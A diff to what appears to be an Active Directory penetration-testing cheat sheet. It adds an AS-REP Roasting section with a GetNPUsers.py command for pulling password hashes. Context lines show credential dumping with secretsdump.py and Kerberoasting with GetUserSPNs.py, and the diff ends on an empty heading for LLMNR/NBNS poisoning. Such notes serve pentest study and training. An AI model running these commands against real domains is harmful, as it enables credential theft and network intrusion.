@@ -127,3 +127,13 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
     #we can send a single request to get a TGS ticket for the target user that has SPN, since TGS is encrypted with target-user credentials we can crack it and Done!
     impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User -request-user Target-user
     ```
+    
+# 10-AS-REP Roasting:
+  - First We need to find users with "Do not require Kerberos preauthentication" attribute
+  - if we find any, it enables the attacker to retrieve password hashes for AD users
+  ```
+  impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP <DomainName>/ -usersfile /tmp/users.txt
+  ```
+  
+  
+# 11-LLMNR/NBNS Poisoning  
